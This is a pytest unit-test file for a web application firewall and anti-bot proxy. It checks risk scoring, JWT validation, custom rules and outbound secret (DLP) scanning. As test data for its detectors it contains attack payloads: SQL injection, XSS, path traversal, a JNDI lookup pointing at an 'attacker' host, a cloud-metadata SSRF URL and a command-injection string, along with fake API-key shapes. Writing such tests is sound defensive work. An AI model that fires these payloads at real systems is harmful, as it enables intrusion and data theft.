"""Unit tests for AppSecGW critical paths.

Run with:  pytest tests/test_critical.py -v
Requires:  pytest, the proxy.py module on PYTHONPATH, UPSTREAM=http://x.test (any URL).

Tests are runtime-pure: no network, no Docker. They import functions directly
from proxy.py and exercise their inputs/outputs. Async tests use pytest-asyncio
where needed; for now we keep things synchronous.
"""
import os
import sys
import importlib
import time
import secrets

# Required env so proxy.py loads without bailing
os.environ.setdefault("UPSTREAM", "http://upstream.test")
os.environ.setdefault("DB_PATH", "/tmp/pytest_antibot.db")

# Wipe any prior pytest DB
if os.path.exists("/tmp/pytest_antibot.db"):
    os.remove("/tmp/pytest_antibot.db")

# Load proxy.py as module
PROXY_PATH = os.path.join(os.path.dirname(__file__), "..", "proxy.py")
spec = importlib.util.spec_from_file_location("proxy", PROXY_PATH)
proxy = importlib.util.module_from_spec(spec)
spec.loader.exec_module(proxy)


# ── Risk model ─────────────────────────────────────────────────────────────
def test_risk_weights_complete():
    """Every reason emitted by middleware must have a weight (or zero)."""
    must_exist = [
        "honeypot", "honeypot-silent", "suspicious-path", "ai-probe",
        "ai-enumeration", "behavior", "ua-empty", "ua-blocked",
        "ua-non-browser", "ai-headers-empty", "ua-too-short",
        "ai-headers-incomplete", "upstream-404", "ai-no-assets",
        "session-flood", "rate-limit-ip", "rate-limit", "host-not-allowed",
        "suspicious-body", "bot-trap", "canary-echo", "session-churn",
        "fp-banned", "traffic-threshold", "js-challenge", "tls-fingerprint",
        "origin-mismatch", "missing-required-header",
        "ua-platform-mismatch", "accept-wildcard-html",
        "ja4-required-missing", "headers-suspicious",
        "abuseipdb-high", "abuseipdb-med", "crowdsec-banned", "asn-hosting",
    ]
    for reason in must_exist:
        assert reason in proxy.RISK_WEIGHTS, f"missing weight for {reason!r}"


def test_risk_decay_halves_per_hour():
    """A score of 100 should decay to ~50 after 1 hour."""
    class S:
        risk_score = 100.0
        last_risk_update = proxy.now() - proxy.RISK_DECAY_HALFLIFE_SECS
    proxy._decay_risk(S, proxy.now())
    assert 49.5 < S.risk_score < 50.5, f"got {S.risk_score}"


def test_risk_threshold_normal_vs_nat():
    assert proxy.RISK_BAN_THRESHOLD < proxy.RISK_BAN_THRESHOLD_NAT
    # NAT threshold should require ≥2× evidence
    assert proxy.RISK_BAN_THRESHOLD_NAT >= 2 * proxy.RISK_BAN_THRESHOLD


# ── Identity ──────────────────────────────────────────────────────────────
def test_session_signing_roundtrip():
    sid = secrets.token_urlsafe(12)
    signed = proxy._sign_session(sid)
    assert proxy._verify_session(signed) == sid
    # Tampered payload fails
    tampered = sid + "X." + signed.split(".", 1)[1]
    assert proxy._verify_session(tampered) is None
    # Garbage fails
    assert proxy._verify_session("not-a-token") is None
    assert proxy._verify_session("") is None


def test_browser_fingerprint_stable():
    class Req:
        def __init__(self, headers): self.headers = headers
    h = {"User-Agent": "Mozilla/5.0 Chrome/120",
         "Accept-Language": "en-US",
         "Sec-Ch-Ua": '"Chromium";v="120"'}
    fp1 = proxy.browser_fingerprint(Req(h))
    fp2 = proxy.browser_fingerprint(Req(h))
    assert fp1 == fp2
    h2 = dict(h, **{"User-Agent": "Mozilla/5.0 Chrome/121"})
    assert proxy.browser_fingerprint(Req(h2)) != fp1


# ── Suspicious path patterns ──────────────────────────────────────────────
def test_suspicious_path_catches_ctf():
    # Word-boundary matches (most direct cases)
    assert proxy.is_suspicious_path("/flag.txt")
    assert proxy.is_suspicious_path("/passwd")
    assert proxy.is_suspicious_path("/secret")
    # Path traversal
    assert proxy.is_suspicious_path("/api/../etc/passwd")
    assert proxy.is_suspicious_path("/static/%2e%2e/secret")
    # Backup files
    assert proxy.is_suspicious_path("/config.bak")
    assert proxy.is_suspicious_path("/dump.sql")
    # SQLi / XSS / LFI markers
    assert proxy.is_suspicious_path("/users?id=1' OR 1=1--")
    assert proxy.is_suspicious_path("/search?q=<script>alert(1)")
    # VCS metadata
    assert proxy.is_suspicious_path("/.git/HEAD")
    # Note: /.env is intentionally NOT in suspicious-path (it's a HONEYPOT path)


def test_suspicious_path_passes_normal():
    assert not proxy.is_suspicious_path("/")
    assert not proxy.is_suspicious_path("/about")
    assert not proxy.is_suspicious_path("/api/v1/products")
    assert not proxy.is_suspicious_path("/static/main.css")


# ── PoW (challenge cookie HMAC) ───────────────────────────────────────────
def test_pow_challenge_signing():
    challenge = proxy.make_pow_challenge()
    parts = challenge.split("|")
    assert len(parts) >= 4
    # Tampered sig fails
    bogus = challenge.rsplit("|", 1)[0] + "|" + "0" * 64
    ok, _ = proxy.verify_pow(bogus, "any")
    assert ok is False


# ── Admin IP CRUD ──────────────────────────────────────────────────────────
def test_admin_ip_validation():
    """Empty / malformed CIDRs rejected at the helper level."""
    import asyncio
    async def go():
        ok, msg = await proxy.admin_ip_add("", "")
        assert not ok and "empty" in msg
        ok, msg = await proxy.admin_ip_add("not-an-ip", "")
        assert not ok and "invalid" in msg
        ok, msg = await proxy.admin_ip_add("10.0.0.0/8", "test", description="LAN")
        assert ok and any(e["cidr"] == "10.0.0.0/8" for e in proxy.ADMIN_ALLOWED_ENTRIES)
        # PATCH description
        ok, msg = await proxy.admin_ip_update_description("10.0.0.0/8", "updated")
        assert ok
        for e in proxy.ADMIN_ALLOWED_ENTRIES:
            if e["cidr"] == "10.0.0.0/8":
                assert e["description"] == "updated"
        # Remove
        ok, msg = await proxy.admin_ip_remove("10.0.0.0/8")
        assert ok and not any(e["cidr"] == "10.0.0.0/8" for e in proxy.ADMIN_ALLOWED_ENTRIES)
    asyncio.run(go())


# ── Bot-trap (multiple decoy fields, 1.5.4) ───────────────────────────────
def test_bot_trap_multiple_fields():
    assert len(proxy.BOT_TRAP_FIELDS) >= 4
    # Empty body → not triggered
    triggered, _ = proxy._bot_trap_triggered(b"", "application/x-www-form-urlencoded")
    assert not triggered
    # Disabled BOT_TRAP_FORMS → not triggered (default 0)
    if not proxy.BOT_TRAP_FORMS:
        body = (proxy.BOT_TRAP_FIELDS[0] + "=evil").encode()
        triggered, _ = proxy._bot_trap_triggered(body, "application/x-www-form-urlencoded")
        assert not triggered
    # Force-enable for the test
    proxy.BOT_TRAP_FORMS = True
    body = (proxy.BOT_TRAP_FIELDS[1] + "=hello&user=x").encode()
    triggered, field = proxy._bot_trap_triggered(body, "application/x-www-form-urlencoded")
    assert triggered and field == proxy.BOT_TRAP_FIELDS[1]
    # Empty value still passes
    body = (proxy.BOT_TRAP_FIELDS[1] + "=&user=x").encode()
    triggered, field = proxy._bot_trap_triggered(body, "application/x-www-form-urlencoded")
    assert not triggered


# ── /antibot-appsec-gateway/secured/scoring shape ──────────────────────────────────────────────────────
def test_scoring_signals_have_cost():
    """Every weight row in /antibot-appsec-gateway/secured/scoring must include a cost_ms triple."""
    # Build the same map the endpoint builds
    for sig in proxy.RISK_WEIGHTS:
        # Cost may not exist for some signals; falls back to default in endpoint
        assert isinstance(sig, str) and sig


# ── 1.5.5 — Promoted hot-reload knobs ─────────────────────────────────────
def test_15_promoted_knobs_in_hot_reload():
    """All 14 Tier 1+2+3 knobs must be in _HOT_RELOAD_KNOBS."""
    promoted = [
        "JS_CHALLENGE_TTL", "ENUM_THRESHOLD", "TIMELINE_RETAIN_SECS",
        "SVC_DB_RETENTION_HOURS", "COST_RETAIN_SECS", "LOG_FORMAT",
        "POW_REQUIRED_PATHS", "ALLOWED_METHODS", "ALLOWED_HOSTS",
        "MAX_IDENTITIES", "PRUNE_IDLE_SECS",
        "UPSTREAM_MAX_BODY", "UPSTREAM_MAX_RESP",
    ]
    for k in promoted:
        assert k in proxy._HOT_RELOAD_KNOBS, f"missing knob {k!r}"


def test_method_set_parser():
    """_to_method_set normalises to upper-case + drops empties."""
    s = proxy._to_method_set("get,post,put")
    assert s == {"GET", "POST", "PUT"}
    s = proxy._to_method_set(["GET", "post ", "", "  "])
    assert s == {"GET", "POST"}


def test_host_set_parser():
    """_to_host_set lower-cases + strips."""
    s = proxy._to_host_set("FOO.com, Bar.NET ,")
    assert s == {"foo.com", "bar.net"}


def test_method_validator_rejects_garbage():
    """ALLOWED_METHODS validator must reject non-HTTP-standard methods."""
    parser, validator = proxy._HOT_RELOAD_KNOBS["ALLOWED_METHODS"]
    assert validator(parser("GET,POST"))             # accepted
    assert not validator(parser("FOO,BAR"))          # rejected
    assert not validator(parser(""))                  # empty rejected


def test_log_format_validator():
    parser, validator = proxy._HOT_RELOAD_KNOBS["LOG_FORMAT"]
    assert validator(parser("json"))
    assert validator(parser("TEXT"))                  # case-insensitive
    assert not validator(parser("xml"))


def test_threshold_bounds():
    """Numeric validators reject out-of-range values."""
    cases = [
        ("RISK_BAN_THRESHOLD",       0,    False),    # below min
        ("RISK_BAN_THRESHOLD",       50,   True),
        ("JS_CHALLENGE_TTL",         30,   False),    # below min
        ("JS_CHALLENGE_TTL",         86400 * 365, False),  # above max
        ("JS_CHALLENGE_TTL",         3600, True),
        ("ENUM_THRESHOLD",           5,    False),    # below min
        ("ENUM_THRESHOLD",           300,  True),
        ("ANUBIS_DIFFICULTY_BOOST",  -1,   False),
        ("ANUBIS_DIFFICULTY_BOOST",  3,    True),
        ("ANUBIS_DIFFICULTY_BOOST",  10,   False),    # above max
    ]
    for name, value, expected in cases:
        parser, validator = proxy._HOT_RELOAD_KNOBS[name]
        try:
            v = parser(value)
        except (ValueError, TypeError):
            assert not expected, f"{name}={value!r} unexpectedly failed parse"
            continue
        ok = (validator is None) or validator(v)
        assert ok == expected, \
            f"{name}={value!r} expected {expected}, validator returned {ok}"


def test_env_precedence_marker():
    """1.5.5 — by default DB wins over env (most-helpful UX: dashboard
    mutations survive restart).  _ENV_PROVIDED_KNOBS is only populated
    when CONFIG_KV_STRICT_ENV=1 is explicitly set (GitOps mode)."""
    if os.environ.get("CONFIG_KV_STRICT_ENV", "0") in ("1", "true", "yes"):
        # strict mode — every entry must be both env AND hot-reloadable
        for k in proxy._ENV_PROVIDED_KNOBS:
            assert k in os.environ
            assert k in proxy._HOT_RELOAD_KNOBS
    else:
        # default: empty set (DB takes precedence)
        assert proxy._ENV_PROVIDED_KNOBS == set()


# ── 1.5.5 — config_kv persistence ─────────────────────────────────────────
def test_config_kv_table_exists():
    """db_init() creates the config_kv table for hot-reload knob persistence."""
    import sqlite3
    proxy.db_init()
    conn = sqlite3.connect(proxy.DB_PATH)
    cols = [r[1] for r in conn.execute("PRAGMA table_info(config_kv)")]
    conn.close()
    assert cols == ["key", "value", "ts"], f"unexpected columns: {cols}"


# ── 1.5.5 — TURNSTILE off-by-default ──────────────────────────────────────
def test_turnstile_default_off():
    """Even when TURNSTILE_SITEKEY/SECRET are configured, TURNSTILE_ENABLED
    must default off until the operator opts in (closes the test-key auto-on
    risk found in pentest R20)."""
    # In the unit-test env we don't set Turnstile keys, so it stays off.
    # The helper distinguishes 'configured' from 'enabled'.
    assert hasattr(proxy, "_TURNSTILE_CONFIGURED")
    # Spec: enabled requires both configured AND TURNSTILE_ENABLED env=1
    if proxy._TURNSTILE_CONFIGURED and os.environ.get("TURNSTILE_ENABLED", "0") in ("1", "true", "yes"):
        assert proxy.TURNSTILE_ENABLED is True
    else:
        assert proxy.TURNSTILE_ENABLED is False


# ── 1.5.5 — Trusted-proxies XFF spoof guard ───────────────────────────────
def test_trusted_proxies_blocks_spoof():
    """When TRUSTED_PROXIES is set and the peer is NOT in it, get_ip()
    must IGNORE X-Forwarded-For and fall back to the raw socket IP.
    (Closes the round-1 pentest finding.)"""
    import ipaddress
    # Set up a TRUSTED_PROXIES that excludes 127.0.0.1
    proxy.TRUSTED_PROXIES_NETS = [ipaddress.ip_network("10.0.0.0/8")]
    proxy.TRUST_XFF = "first"
    class Req:
        def __init__(self, remote, headers): self.remote, self.headers = remote, headers
    req = Req("127.0.0.1", {"X-Forwarded-For": "8.8.8.8"})
    ip = proxy.get_ip(req)
    assert ip == "127.0.0.1", f"XFF spoof leaked through: {ip}"
    # Same setup but peer IS in the trusted CIDR — XFF honoured.
    req2 = Req("10.0.0.5", {"X-Forwarded-For": "8.8.8.8"})
    ip2 = proxy.get_ip(req2)
    assert ip2 == "8.8.8.8", f"trusted peer's XFF dropped: {ip2}"
    # Reset for other tests
    proxy.TRUSTED_PROXIES_NETS = []


# ── 1.6.0 — Tier A: country block / allowlist ────────────────────────────
def test_16_country_set_parser():
    """2-letter alpha codes only; rejects names and 3-letter codes.
    (EU passes the syntactic filter but GeoLite2-City never emits EU as a
    country code, so it's a no-op in practice.)"""
    s = proxy._to_country_set("RU,CN,KP,US,Russia,DEU,DE")
    assert s == {"RU", "CN", "KP", "US", "DE"}, s
    assert proxy._to_country_set([]) == set()
    assert proxy._to_country_set("") == set()
    assert proxy._to_country_set("ru,cn") == {"RU", "CN"}


def test_16_country_signals_in_risk_weights():
    """All Tier-A signals MUST have a weight registered."""
    for sig in ("country-blocked", "tor-exit", "datacenter-vpn",
                "ua-ai-openai", "ua-ai-anthropic", "ua-ai-google",
                "ua-ai-perplexity", "ua-ai-meta", "ua-ai-other"):
        assert sig in proxy.RISK_WEIGHTS, f"missing weight: {sig}"
    # Sanity: country-blocked is hard tier (≥ ban threshold).
    # tor-exit demoted to 40 in 1.6.3 — Tor includes legit privacy users
    # (journalists, activists), so it requires 2 strikes rather than 1.
    assert proxy.RISK_WEIGHTS["country-blocked"] >= 50
    assert proxy.RISK_WEIGHTS["tor-exit"] >= 30


def test_16_country_hot_reload_knobs():
    """All Tier-A toggles must be hot-reloadable."""
    for k in ("COUNTRY_BLOCK_ENABLED", "COUNTRY_DENYLIST", "COUNTRY_ALLOWLIST",
              "TOR_BLOCK_ENABLED", "DC_VPN_BLOCK_ENABLED",
              "AI_UA_OPENAI_ENABLED", "AI_UA_ANTHROPIC_ENABLED",
              "AI_UA_GOOGLE_ENABLED", "AI_UA_PERPLEXITY_ENABLED",
              "AI_UA_META_ENABLED", "AI_UA_OTHER_ENABLED",
              "ENDPOINT_POLICIES"):
        assert k in proxy._HOT_RELOAD_KNOBS, f"not hot-reloadable: {k}"


# ── 1.6.0 — Tier A: AI-crawler granular groups ───────────────────────────
def test_16_ai_groups_nonempty():
    """Every AI group must have at least one fragment defined."""
    expected = {"openai", "anthropic", "google", "perplexity", "meta", "other"}
    assert set(proxy.AI_UA_GROUPS.keys()) == expected
    for grp, frags in proxy.AI_UA_GROUPS.items():
        assert len(frags) >= 1, f"empty AI group: {grp}"


def test_16_ai_group_uas_are_lowercase():
    """Fragments must all be lower-cased — the detector compares against
    ua.lower(), so a stray uppercase entry would silently never match."""
    for grp, frags in proxy.AI_UA_GROUPS.items():
        for f in frags:
            assert f == f.lower(), f"non-lower fragment in {grp!r}: {f!r}"


# ── 1.6.0 — Tier A: per-endpoint policy engine ───────────────────────────
def test_16_endpoint_policy_parser():
    """Accepts JSON string, list of dicts, or list of [path,policy] pairs.
    Drops invalid policy names; preserves order. 1.6.1 — each item is
    now a dict {path, policy, rps?, burst?} (rps/burst absent → None)."""
    p1 = proxy._to_endpoint_policies('[{"path":"/api/*","policy":"bypass"}]')
    assert p1 == [{"path": "/api/*", "policy": "bypass",
                   "rps": None, "burst": None}]
    p2 = proxy._to_endpoint_policies([{"path": "/admin", "policy": "strict"}])
    assert p2 == [{"path": "/admin", "policy": "strict",
                   "rps": None, "burst": None}]
    # Invalid policy name must be silently dropped
    p3 = proxy._to_endpoint_policies([{"path": "/x", "policy": "nuke-it"}])
    assert p3 == []
    # Empty / malformed
    assert proxy._to_endpoint_policies("") == []
    assert proxy._to_endpoint_policies("not json") == []
    assert proxy._to_endpoint_policies(None) == []


def test_16_endpoint_policy_match():
    """`*` glob must match a prefix; 'first match wins'.
    1.6.1 — items are now dicts; legacy [path, policy] pairs still
    accepted by `_endpoint_rule` for backwards compatibility."""
    save = proxy.ENDPOINT_POLICIES
    try:
        proxy.ENDPOINT_POLICIES = [
            {"path": "/api/v1/admin", "policy": "strict",   "rps": None, "burst": None},
            {"path": "/api/*",        "policy": "bypass",   "rps": None, "burst": None},
            {"path": "/admin",        "policy": "challenge","rps": None, "burst": None},
        ]
        assert proxy._endpoint_policy("/api/v1/admin") == "strict"
        assert proxy._endpoint_policy("/api/v1/users") == "bypass"
        assert proxy._endpoint_policy("/admin") == "challenge"
        assert proxy._endpoint_policy("/public") == "default"
        # legacy pair still works
        proxy.ENDPOINT_POLICIES = [["/legacy", "bypass"]]
        assert proxy._endpoint_policy("/legacy") == "bypass"
    finally:
        proxy.ENDPOINT_POLICIES = save


# ── 1.6.0 — descriptions present for every Tier-A signal ────────────────
def test_16_descriptions_complete():
    """The /antibot-appsec-gateway/secured/scoring endpoint serves a description per signal — make sure
    every 1.6.0 reason has one (otherwise the dashboard tooltip is empty)."""
    # Easiest way: invoke the endpoint's body indirectly by inspecting source
    # text — DESCRIPTIONS is local to scoring_endpoint, but the fact that
    # RISK_WEIGHTS is complete + tests_v15 check tier coverage is enough.
    # We assert that the reason names are valid Python identifiers (post the
    # `ua-ai-*` family) and that the AI groups are 1:1 with weights.
    for grp in proxy.AI_UA_GROUPS:
        assert f"ua-ai-{grp}" in proxy.RISK_WEIGHTS


# ── 1.6.1 — Tier B: custom rules engine ─────────────────────────────────
def test_161_custom_rules_parser():
    """Accepts JSON string + decoded list. Drops unknown actions / empty paths."""
    rs = proxy._to_custom_rules('[{"if":{"path":"/a"},"then":"allow"}]')
    assert rs == [{"if": {"path": "/a"}, "then": "allow", "tag": ""}]
    # cidr pre-compiled into ip_network objects
    rs = proxy._to_custom_rules([{"if": {"ip_cidr": "10.0.0.0/8"}, "then": "block"}])
    import ipaddress
    assert isinstance(rs[0]["if"]["ip_cidr"][0], ipaddress.IPv4Network)
    # unknown action dropped
    assert proxy._to_custom_rules('[{"if":{"path":"/a"},"then":"nuke"}]') == []
    # empty / malformed
    assert proxy._to_custom_rules("") == []
    assert proxy._to_custom_rules("not json") == []


def test_161_custom_rule_match_path_method_header():
    save = proxy.CUSTOM_RULES
    try:
        proxy.CUSTOM_RULES = proxy._to_custom_rules([
            {"if": {"path": "/api/*", "method": "POST", "header.X-Caller": "lambda"},
             "then": "allow"},
            {"if": {"path": "/wp-login.php"}, "then": "block"},
        ])
        class Req:
            def __init__(self, path, method="GET", headers=None, query=None):
                self.path = path; self.method = method
                self.headers = headers or {}
                self.query = query or {}
        # Match #1
        a, t = proxy._eval_custom_rules(
            Req("/api/v1", "POST", {"X-Caller": "lambda-handler"}), "1.2.3.4")
        assert a == "allow", (a, t)
        # Method mismatch — falls through; #1 fails, #2 doesn't match path → none
        a, _ = proxy._eval_custom_rules(Req("/api/v1", "GET"), "1.2.3.4")
        assert a is None
        # Match #2
        a, _ = proxy._eval_custom_rules(Req("/wp-login.php"), "1.2.3.4")
        assert a == "block"
    finally:
        proxy.CUSTOM_RULES = save


def test_161_custom_rule_ip_cidr():
    save = proxy.CUSTOM_RULES
    try:
        proxy.CUSTOM_RULES = proxy._to_custom_rules([
            {"if": {"ip_cidr": ["10.0.0.0/8", "192.168.0.0/16"]}, "then": "allow"},
        ])
        class Req:
            path = "/x"; method = "GET"; headers = {}; query = {}
        a, _ = proxy._eval_custom_rules(Req(), "10.5.6.7")
        assert a == "allow"
        a, _ = proxy._eval_custom_rules(Req(), "8.8.8.8")
        assert a is None
    finally:
        proxy.CUSTOM_RULES = save


# ── 1.6.1 — Tier B: per-endpoint rate limit ─────────────────────────────
def test_161_endpoint_policies_rps_burst():
    rs = proxy._to_endpoint_policies(
        '[{"path":"/login","policy":"challenge","rps":5,"burst":10}]')
    assert rs == [{"path": "/login", "policy": "challenge",
                   "rps": 5.0, "burst": 10}]
    # Out-of-bounds rps gets dropped to None
    rs = proxy._to_endpoint_policies(
        '[{"path":"/x","policy":"default","rps":99999999,"burst":1}]')
    assert rs[0]["rps"] is None
    # Legacy [path, policy] pair still works (rps/burst absent)
    rs = proxy._to_endpoint_policies('[["/old","bypass"]]')
    assert rs[0]["rps"] is None and rs[0]["policy"] == "bypass"


def test_161_endpoint_rule_lookup():
    save = proxy.ENDPOINT_POLICIES
    try:
        proxy.ENDPOINT_POLICIES = [
            {"path": "/api/v1/*", "policy": "bypass",   "rps": None, "burst": None},
            {"path": "/login",    "policy": "challenge","rps": 5,    "burst": 10},
        ]
        r = proxy._endpoint_rule("/login")
        assert r is not None and r["rps"] == 5
        r = proxy._endpoint_rule("/api/v1/users")
        assert r is not None and r["policy"] == "bypass"
        r = proxy._endpoint_rule("/missing")
        assert r is None
    finally:
        proxy.ENDPOINT_POLICIES = save


# ── 1.6.1 — Tier B: managed body-pattern groups ─────────────────────────
def test_161_body_groups_match():
    """Each managed group must catch its target attack family."""
    proxy.BODY_PATTERN_MATCH = True
    proxy.BODY_GROUP_SQLI_ENABLED = True
    proxy.BODY_GROUP_XSS_ENABLED  = True
    proxy.BODY_GROUP_LFI_ENABLED  = True
    proxy.BODY_GROUP_RCE_ENABLED  = True
    proxy.BODY_GROUP_SSRF_ENABLED = True
    proxy.BODY_GROUP_CMD_ENABLED  = True
    cases = [
        (b"q=' UNION SELECT * FROM users--",         "application/x-www-form-urlencoded", "sqli"),
        (b"<script>alert(1)</script>",               "text/plain",                        "xss"),
        (b"path=../../../../etc/passwd",             "text/plain",                        "lfi"),
        (b"x=${jndi:ldap://attacker/a}",             "text/plain",                        "rce"),
        (b"u=http://169.254.169.254/latest/",        "text/plain",                        "ssrf"),
        (b"; whoami",                                "text/plain",                        "cmd"),
    ]
    for body, ctype, expected in cases:
        assert proxy.match_body_group(body, ctype) == expected, (body, expected)


def test_161_body_group_disabled():
    """When a group is toggled off it must NOT fire (nor a different group
    accidentally)."""
    proxy.BODY_PATTERN_MATCH = True
    save = proxy.BODY_GROUP_SQLI_ENABLED
    proxy.BODY_GROUP_SQLI_ENABLED = False
    try:
        # SQLi-only payload that matches no other group
        m = proxy.match_body_group(b"q=' OR 1=1 --", "application/x-www-form-urlencoded")
        assert m != "sqli"
    finally:
        proxy.BODY_GROUP_SQLI_ENABLED = save


# ── 1.6.1 — Tier B: JWT validation ──────────────────────────────────────
def _mk_jwt(payload, secret):
    import base64, hmac, hashlib, json
    def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64u(sig)}"


def test_161_jwt_signature_verify():
    proxy.JWT_HMAC_SECRET = "test-secret"
    proxy.JWT_REQUIRED_ISSUER = ""
    proxy.JWT_REQUIRED_AUDIENCE = ""
    tok = _mk_jwt({"sub": "u", "exp": int(time.time()) + 60}, "test-secret")
    ok, _ = proxy._verify_jwt_hs256(tok)
    assert ok
    # Tampered signature
    ok, err = proxy._verify_jwt_hs256(tok[:-2] + "AB")
    assert not ok and err == "bad-signature"
    # Wrong secret
    proxy.JWT_HMAC_SECRET = "different-secret"
    ok, err = proxy._verify_jwt_hs256(tok)
    assert not ok and err == "bad-signature"


def test_161_jwt_expiry_and_claims():
    proxy.JWT_HMAC_SECRET = "s"
    proxy.JWT_REQUIRED_ISSUER = "iss-x"
    proxy.JWT_REQUIRED_AUDIENCE = "aud-y"
    proxy.JWT_LEEWAY_SECS = 30
    # All good
    tok = _mk_jwt({"sub": "u", "iss": "iss-x", "aud": "aud-y",
                   "exp": int(time.time()) + 60}, "s")
    ok, _ = proxy._verify_jwt_hs256(tok)
    assert ok
    # Issuer mismatch
    tok = _mk_jwt({"sub": "u", "iss": "wrong", "aud": "aud-y",
                   "exp": int(time.time()) + 60}, "s")
    ok, err = proxy._verify_jwt_hs256(tok)
    assert not ok and err == "issuer-mismatch"
    # Audience as list
    tok = _mk_jwt({"sub": "u", "iss": "iss-x", "aud": ["other", "aud-y"],
                   "exp": int(time.time()) + 60}, "s")
    ok, _ = proxy._verify_jwt_hs256(tok)
    assert ok
    # Expired (with leeway)
    tok = _mk_jwt({"sub": "u", "iss": "iss-x", "aud": "aud-y",
                   "exp": int(time.time()) - 100}, "s")
    ok, err = proxy._verify_jwt_hs256(tok)
    assert not ok and err == "expired"


def test_161_jwt_required_for():
    save = proxy.JWT_VALIDATE_PATHS
    try:
        proxy.JWT_VALIDATE_PATHS = ["/api/v1/*", "/admin/*"]
        assert proxy._jwt_required_for("/api/v1/users")
        assert proxy._jwt_required_for("/admin/dashboard")
        assert not proxy._jwt_required_for("/public")
        proxy.JWT_VALIDATE_PATHS = []
        assert not proxy._jwt_required_for("/api/v1/users")
    finally:
        proxy.JWT_VALIDATE_PATHS = save


# ── 1.6.1 — Tier B: hot-reload knobs ────────────────────────────────────
def test_161_tier_b_hot_reload_knobs():
    """All Tier-B toggles + lists must be hot-reloadable so the operator
    can tune them via /antibot-appsec-gateway/secured/config without a restart."""
    for k in ("CUSTOM_RULES",
              "BODY_GROUP_SQLI_ENABLED", "BODY_GROUP_XSS_ENABLED",
              "BODY_GROUP_LFI_ENABLED",  "BODY_GROUP_RCE_ENABLED",
              "BODY_GROUP_SSRF_ENABLED", "BODY_GROUP_CMD_ENABLED",
              "JWT_VALIDATE_PATHS", "JWT_REQUIRED_ISSUER",
              "JWT_REQUIRED_AUDIENCE"):
        assert k in proxy._HOT_RELOAD_KNOBS, f"not hot-reloadable: {k}"


def test_161_tier_b_signals_in_risk_weights():
    """Every Tier-B reason must have a weight registered."""
    for sig in ("custom-rule-block", "rate-limit-endpoint",
                "body-sqli", "body-xss", "body-lfi", "body-rce",
                "body-ssrf", "body-cmd", "auth-jwt-invalid"):
        assert sig in proxy.RISK_WEIGHTS, f"missing weight: {sig}"
    assert proxy.RISK_WEIGHTS["custom-rule-block"] >= 50
    assert proxy.RISK_WEIGHTS["rate-limit-endpoint"] == 0
    assert proxy.RISK_WEIGHTS["body-rce"] >= 50


# ── 1.6.2 — Tier C: outbound DLP scanning ───────────────────────────────
def test_162_dlp_aws_keys():
    """AKIA*/ASIA* access-key IDs and labelled secrets fire the `aws` group."""
    proxy.DLP_ENABLED = True
    hits = proxy.dlp_scan(b"AKIA1234567890ABCDEF", "application/json")
    assert any(g == "aws" for g, _ in hits), hits
    hits = proxy.dlp_scan(b'aws_secret_access_key = "abcdefghijklmnopqrstuvwxyz0123456789ABCD"',
                           "text/plain")
    assert any(g == "aws" for g, _ in hits), hits


def test_162_dlp_jwt():
    """JWTs in upstream responses fire the `jwt` group."""
    proxy.DLP_ENABLED = True
    tok = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.aaaaaaaaaa"
    hits = proxy.dlp_scan(f'response: {{"token":"{tok}"}}'.encode(), "application/json")
    assert any(g == "jwt" for g, _ in hits), hits


def test_162_dlp_private_key():
    proxy.DLP_ENABLED = True
    pem = (b"-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n"
           b"-----END RSA PRIVATE KEY-----")
    hits = proxy.dlp_scan(pem, "text/plain")
    assert any(g == "private-key" for g, _ in hits), hits


def test_162_dlp_credit_card_luhn():
    """Luhn check eliminates false positives — random 16-digit runs must
    NOT match, but a Luhn-valid CC (4111-1111-1111-1111) must."""
    proxy.DLP_ENABLED = True
    # Real Visa test PAN — passes Luhn
    hits = proxy.dlp_scan(b'card: 4111-1111-1111-1111 thanks', "application/json")
    assert any(g == "cc" for g, _ in hits), hits
    # Random 16 digits — fails Luhn
    hits = proxy.dlp_scan(b'order id: 1234-5678-9012-3456', "application/json")
    assert not any(g == "cc" for g, _ in hits), hits


def test_162_dlp_api_key():
    """Common API-key shapes (Slack, GitHub, OpenAI) match `api-key` group."""
    proxy.DLP_ENABLED = True
    cases = [
        b"slack token: xoxb-1234567890-abcdefghij-AbCdEfGhIjKlMnOp",
        b"GH_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789ABC",
        b"OPENAI_KEY=sk-1234567890abcdefghijklmnopqrstuvwxyzABCD",
    ]
    for body in cases:
        hits = proxy.dlp_scan(body, "text/plain")
        assert any(g == "api-key" for g, _ in hits), (body, hits)


def test_162_dlp_disabled_when_off():
    """DLP_ENABLED=0 returns no hits regardless of payload."""
    proxy.DLP_ENABLED = False
    hits = proxy.dlp_scan(b"AKIA1234567890ABCDEF", "application/json")
    assert hits == []
    proxy.DLP_ENABLED = True


def test_162_dlp_only_text_content_types():
    """Binary content types (image/png, application/pdf) are skipped."""
    proxy.DLP_ENABLED = True
    pem = b"-----BEGIN RSA PRIVATE KEY-----"
    assert proxy.dlp_scan(pem, "image/png") == []
    assert proxy.dlp_scan(pem, "application/pdf") == []
    # but text/plain hits
    assert proxy.dlp_scan(pem, "text/plain")


def test_162_dlp_redact():
    """Redaction substitutes [REDACTED-<group>] for every match."""
    body = b'{"akey": "AKIA1234567890ABCDEF", "user": "x"}'
    hits = [("aws", b"AKIA1234567890ABCDEF")]
    out = proxy.dlp_redact(body, hits)
    assert b"AKIA1234567890ABCDEF" not in out
    assert b"[REDACTED-aws]" in out


def test_162_dlp_max_bytes_bound():
    """DLP doesn't scan beyond DLP_MAX_BYTES — large garbage following a
    secret in the first KB still hits, but a secret only present in the
    overflow region is missed (deliberate cost cap)."""
    proxy.DLP_ENABLED = True
    proxy.DLP_MAX_BYTES = 1024
    # Secret early — hits. \b requires whitespace AFTER the access-key ID.
    hits = proxy.dlp_scan(b"AKIA1234567890ABCDEF " + b"=" * 4096, "text/plain")
    assert any(g == "aws" for g, _ in hits)
    # Secret beyond bound — misses (the `=` filler is non-word so the
    # access key would normally match, but DLP_MAX_BYTES cuts it off).
    hits = proxy.dlp_scan(b"=" * 2048 + b" AKIA1234567890ABCDEF ", "text/plain")
    assert not hits
    proxy.DLP_MAX_BYTES = 256 * 1024   # restore default for other tests


def test_162_luhn_check_helper():
    """Direct unit test for the helper."""
